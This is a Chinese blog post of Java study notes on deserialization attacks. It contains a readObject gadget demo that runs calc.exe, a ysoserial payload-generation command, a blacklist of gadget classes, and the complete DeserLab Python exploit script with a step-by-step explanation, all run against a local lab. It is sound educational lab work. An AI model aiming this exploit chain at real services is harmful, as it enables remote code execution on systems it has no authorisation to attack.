<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="反序列化攻击基础·一"><meta name="keywords" content="反序列化"><meta name="author" content="mlccs,undefined"><meta name="copyright" content="mlccs"><title>反序列化攻击基础·一【!&gt;-_-&lt;!】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"S6Y49E5I4K","apiKey":"8c221da4a00bc9951e60cd14527148e3","indexName":"git_BLOG","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: ,
  valine: ,
}</script><meta name="generator" content="Hexo 5.4.0"></head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E5%9F%BA%E7%A1%80%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.</span> <span class="toc-text">反序列化攻击基础示例</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%B8%B8%E8%A7%81%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">反序列化漏洞常见位置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E5%BA%93%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">基础库中的反序列化漏洞</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Deserlab%E7%BB%83%E4%B9%A0"><span class="toc-number">4.</span> <span class="toc-text">Deserlab练习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#deserllab-exploit-py%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">deserllab_exploit.py代码解析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E4%BB%A3%E7%A0%81"><span class="toc-number">5.1.</span> <span class="toc-text">原代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">5.2.</span> <span class="toc-text">攻击流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BB%BA%E7%AB%8Bsocket%E8%BF%9E%E6%8E%A5"><span class="toc-number">5.2.1.</span> <span class="toc-text">1.建立socket连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%8F%A1%E6%89%8B"><span class="toc-number">5.2.2.</span> <span class="toc-text">2.序列化协议握手</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95"><span class="toc-number">6.</span> <span class="toc-text">反序列化漏洞挖掘方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-number">6.1.</span> <span class="toc-text">白盒测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95"><span class="toc-number">6.2.</span> <span class="toc-text">黑盒测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE%E7%9A%84%E6%8F%90%E5%8F%96"><span class="toc-number">6.3.</span> <span class="toc-text">序列化数据的提取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SerializationDumper%E4%BD%BF%E7%94%A8"><span class="toc-number">6.4.</span> <span class="toc-text">SerializationDumper使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E7%B1%BB%E6%96%87%E4%BB%B6"><span class="toc-number">7.</span> <span class="toc-text">远程加载类文件</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BBDemo-CC3"><span class="toc-number">8.</span> <span class="toc-text">反序列化攻击Demo(CC3)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%97%B6%E7%9A%84java%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="toc-number">9.</span> <span class="toc-text">反序列化利用时的java版本问题</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">mlccs</div><div class="author-info-description"></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">8</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">6</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">3</span></a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">!&gt;-_-&lt;!</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">反序列化攻击基础·一</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2021-12-22 | 更新于 2021-12-22</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">Java安全学习</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div></div></div><div class="main-content"><h1 id="反序列化攻击基础示例"><a href="#反序列化攻击基础示例" class="headerlink" title="反序列化攻击基础示例"></a>反序列化攻击基础示例</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> SerializeTest;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化所需的类都包含在java.io当中，一次性引入，省事</span></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">STest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        UnsafeClass Unsafe = <span class="keyword">new</span> UnsafeClass();</span><br><span class="line">        Unsafe.name = <span class="string">&quot;hacked by ph0rse&quot;</span>;</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">        <span class="comment">//writeObject()方法将Unsafe对象写入object文件</span></span><br><span class="line">        os.writeObject(Unsafe);</span><br><span class="line">        os.close();</span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UnsafeClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span>&#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="反序列化漏洞常见位置"><a href="#反序列化漏洞常见位置" class="headerlink" title="反序列化漏洞常见位置"></a>反序列化漏洞常见位置</h1><p>​    前章示例代码是一个对反序列化操作未执行任何安全校验的示例，实际中基本不会遇到。实际中的反序列化漏洞常出现在以下几种情况：</p>
<ol>
<li>重写的ObjectInputStream对象的resolveClass方法中的检测可被绕过。</li>
<li>使用第三方的类进行黑名单控制。虽然Java的语言严谨性要比PHP强的多，但在大型应用中想要采用黑名单机制禁用掉所有危险的对象几乎是不可能的。因此，如果在审计过程中发现了采用黑名单进行过滤的代码，多半存在一两个‘漏网之鱼’可以利用。并且采取黑名单方式仅仅可能保证此刻的安全，若在后期添加了新的功能，就可能引入了新的漏洞利用方式。所以仅靠黑名单是无法保证序列化过程的安全的。</li>
</ol>
<h1 id="基础库中的反序列化漏洞"><a href="#基础库中的反序列化漏洞" class="headerlink" title="基础库中的反序列化漏洞"></a>基础库中的反序列化漏洞</h1><p>​    一些成熟的Java框架比如Spring MVC、Struts2等，都有相应的防范反序列化的机制。如果仅仅是开发失误，可能很少会产生反序列化漏洞，即使产生，其绕过方法、利用方式也较为复杂。但其实，有很大比例的反序列化漏洞是因使用了不安全的基础库而产生的。<br>​    2015年由黑客Gabriel Lawrence和Chris Frohoff发现的‘Apache Commons Collections’类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。部分存在反序列化漏洞危险的基础库：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">commons-fileupload 1.3.1</span><br><span class="line">commons-io 2.4</span><br><span class="line">commons-collections 3.1</span><br><span class="line">commons-logging 1.2</span><br><span class="line">commons-beanutils 1.9.2</span><br><span class="line">org.slf4j:slf4j-api 1.7.21</span><br><span class="line">com.mchange:mchange-commons-java 0.2.11</span><br><span class="line">org.apache.commons:commons-collections 4.0</span><br><span class="line">com.mchange:c3p0 0.9.5.2</span><br><span class="line">org.beanshell:bsh 2.0b5</span><br><span class="line">org.codehaus.groovy:groovy 2.3.9</span><br><span class="line">org.springframework:spring-aop 4.1.4.RELEASE</span><br></pre></td></tr></table></figure>

<p>相应的，反序列化防护软件可能采取禁用以下类的反序列化的方式来保护程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x27;org.apache.commons.collections.functors.InvokerTransformer&#x27;,</span><br><span class="line">&#x27;org.apache.commons.collections.functors.InstantiateTransformer&#x27;,</span><br><span class="line">&#x27;org.apache.commons.collections4.functors.InvokerTransformer&#x27;,</span><br><span class="line">&#x27;org.apache.commons.collections4.functors.InstantiateTransformer&#x27;,</span><br><span class="line">&#x27;org.codehaus.groovy.runtime.ConvertedClosure&#x27;,</span><br><span class="line">&#x27;org.codehaus.groovy.runtime.MethodClosure&#x27;,</span><br><span class="line">&#x27;org.springframework.beans.factory.ObjectFactory&#x27;,</span><br><span class="line">&#x27;xalan.internal.xsltc.trax.TemplatesImpl&#x27;</span><br></pre></td></tr></table></figure>

<h1 id="Deserlab练习"><a href="#Deserlab练习" class="headerlink" title="Deserlab练习"></a>Deserlab练习</h1><p>生成payload：<br>F:\other\jdks\jdk8\jdk8\bin\java.exe -jar f:\java\ysoserial\ysoserial-0.0.6-SNAPSHOT-all.jar Groovy1 “calc.exe”<br>启动Deserlab服务端<br>F:\other\jdks\jdk8\jdk8\bin\java.exe -jar DeserLab.jar -server 127.0.0.1 6666<br><img src="java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%C2%B7%E4%B8%80/image-20210405234835056.png" alt="image-20210405234835056"><br>执行payload：<br><img src="java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%C2%B7%E4%B8%80/image-20210406004912444.png" alt="image-20210406004912444"><br>正常交互流量如下(橙红色部分是客户端发送的数据)：<br><img src="java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%C2%B7%E4%B8%80/image-20210408112525718.png" alt="image-20210408112525718"></p>
<h1 id="deserllab-exploit-py代码解析"><a href="#deserllab-exploit-py代码解析" class="headerlink" title="deserllab_exploit.py代码解析"></a>deserllab_exploit.py代码解析</h1><h2 id="原代码"><a href="#原代码" class="headerlink" title="原代码"></a>原代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">deser</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,tip,tport</span>):</span></span><br><span class="line">        self.targetip = tip</span><br><span class="line">        self.targetport = <span class="built_in">int</span>(tport)</span><br><span class="line">        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.s.connect((self.targetip, self.targetport))</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">javaserial</span>(<span class="params">self</span>):</span></span><br><span class="line">        blob = <span class="string">&#x27;\xac\xed\x00\x05&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        logging.debug(<span class="string">&quot;server javaserial resp: %s&quot;</span> % self.s.recv(<span class="number">4</span>).encode(<span class="string">&#x27;hex&#x27;</span>))    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">protohello</span>(<span class="params">self</span>):</span></span><br><span class="line">        header = self.s.recv(<span class="number">2</span>)</span><br><span class="line">        datalength = <span class="built_in">int</span>(struct.unpack(<span class="string">&#x27;B&#x27;</span>,header[<span class="number">1</span>])[<span class="number">0</span>])</span><br><span class="line">        logging.debug(<span class="string">&quot;server proto hello %s&quot;</span> % self.s.recv(datalength).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        blob = <span class="string">&#x27;\x77\x04&#x27;</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\xf0\x00\xba\xaa&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">protoversion</span>(<span class="params">self</span>):</span></span><br><span class="line">        header = self.s.recv(<span class="number">2</span>)</span><br><span class="line">        datalength = <span class="built_in">int</span>(struct.unpack(<span class="string">&#x27;B&#x27;</span>,header[<span class="number">1</span>])[<span class="number">0</span>])</span><br><span class="line">        logging.debug(<span class="string">&quot;server version %s&quot;</span> % self.s.recv(datalength).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        blob = <span class="string">&#x27;\x77\x02&#x27;</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\x01\x01&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line">          </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clientname</span>(<span class="params">self</span>):</span></span><br><span class="line">        blob = <span class="string">&#x27;\x77\x09&#x27;</span> <span class="comment">#depends on username + type length</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\x00\x07\x74\x65\x73\x74\x69\x6e\x67&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span>(<span class="params">self, payload_file</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Normally this is where the HashRequest object is send</span></span><br><span class="line"><span class="string">            instead we send a ysoserial payload, skipping the first 4 bytes</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(payload_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> content_file:</span><br><span class="line">            payload = content_file.read()</span><br><span class="line">        self.s.sendall(payload[<span class="number">4</span>:])</span><br><span class="line">        logging.debug(<span class="string">&#x27;after exploit: %s&#x27;</span> % self.s.recv(<span class="number">1024</span>))</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Exploit for DeserLab&#x27;</span>,epilog=<span class="string">&#x27;https://nickbloor.co.uk/2017/08/13/attacking-java-deserialization/&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;targetip&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target ip to exploit&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;targetport&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;target port to exploit&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;payloadfile&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;file with the ysoserial payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    myargs = parser.parse_args()</span><br><span class="line">    </span><br><span class="line">    logging.debug(<span class="string">&quot;target %s&quot;</span> % myargs.targetip)</span><br><span class="line">    logging.debug(<span class="string">&quot;port %s&quot;</span> % myargs.targetport)</span><br><span class="line">    mydeser = deser(myargs.targetip, myargs.targetport)</span><br><span class="line">    logging.info(<span class="string">&quot;Connecting&quot;</span>)</span><br><span class="line">    mydeser.connect()</span><br><span class="line">    logging.info(<span class="string">&quot;java serialization handshake&quot;</span>)</span><br><span class="line">    mydeser.javaserial()</span><br><span class="line">    logging.info(<span class="string">&quot;protocol specific handshake&quot;</span>)</span><br><span class="line">    mydeser.protohello()</span><br><span class="line">    logging.info(<span class="string">&quot;protocol specific version handshake&quot;</span>)</span><br><span class="line">    mydeser.protoversion()</span><br><span class="line">    logging.info(<span class="string">&quot;sending name of connected client&quot;</span>)</span><br><span class="line">    mydeser.clientname()</span><br><span class="line">    logging.info(<span class="string">&quot;exploiting&quot;</span>)</span><br><span class="line">    mydeser.exploit(myargs.payloadfile)</span><br></pre></td></tr></table></figure>

<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><h3 id="1-建立socket连接"><a href="#1-建立socket连接" class="headerlink" title="1.建立socket连接"></a>1.建立socket连接</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,tip,tport</span>):</span></span><br><span class="line">    self.targetip = tip</span><br><span class="line">    self.targetport = <span class="built_in">int</span>(tport)</span><br><span class="line">    self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.s.connect((self.targetip, self.targetport))</span><br></pre></td></tr></table></figure>
<h3 id="2-序列化协议握手"><a href="#2-序列化协议握手" class="headerlink" title="2.序列化协议握手"></a>2.序列化协议握手</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">javaserial</span>(<span class="params">self</span>):</span></span><br><span class="line">    blob = <span class="string">&#x27;\xac\xed\x00\x05&#x27;</span></span><br><span class="line">    self.s.sendall(blob)</span><br><span class="line">    logging.debug(<span class="string">&quot;server javaserial resp: %s&quot;</span> % self.s.recv(<span class="number">4</span>).encode(<span class="string">&#x27;hex&#x27;</span>))    </span><br></pre></td></tr></table></figure>
<p>​    ACED两个字节表示是序列化数据，0005表示协议版本，这是java原生序列化协议的规定</p>
<p>3.握手阶段       </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">protohello</span>(<span class="params">self</span>):</span></span><br><span class="line">        header = self.s.recv(<span class="number">2</span>)</span><br><span class="line">        datalength = <span class="built_in">int</span>(struct.unpack(<span class="string">&#x27;B&#x27;</span>,header[<span class="number">1</span>])[<span class="number">0</span>])</span><br><span class="line">        logging.debug(<span class="string">&quot;server proto hello %s&quot;</span> % self.s.recv(datalength).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">        blob = <span class="string">&#x27;\x77\x04&#x27;</span></span><br><span class="line">        blob2 = <span class="string">&#x27;\xf0\x00\xba\xaa&#x27;</span></span><br><span class="line">        self.s.sendall(blob)</span><br><span class="line">        self.s.sendall(blob2)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">protoversion</span>(<span class="params">self</span>):</span></span><br><span class="line">    header = self.s.recv(<span class="number">2</span>)</span><br><span class="line">    datalength = <span class="built_in">int</span>(struct.unpack(<span class="string">&#x27;B&#x27;</span>,header[<span class="number">1</span>])[<span class="number">0</span>])</span><br><span class="line">    logging.debug(<span class="string">&quot;server version %s&quot;</span> % self.s.recv(datalength).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    blob = <span class="string">&#x27;\x77\x02&#x27;</span></span><br><span class="line">    blob2 = <span class="string">&#x27;\x01\x01&#x27;</span></span><br><span class="line">    self.s.sendall(blob)</span><br><span class="line">    self.s.sendall(blob2)</span><br><span class="line">      </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clientname</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="comment"># 这里没找到相关的资料，只能读那篇英文博客了</span></span><br><span class="line">    blob = <span class="string">&#x27;\x77\x09&#x27;</span> <span class="comment">#depends on username + type length</span></span><br><span class="line">    blob2 = <span class="string">&#x27;\x00\x07\x74\x65\x73\x74\x69\x6e\x67&#x27;</span></span><br><span class="line">    self.s.sendall(blob)</span><br><span class="line">    self.s.sendall(blob2)</span><br></pre></td></tr></table></figure>
<p>4.发送exploit</p>
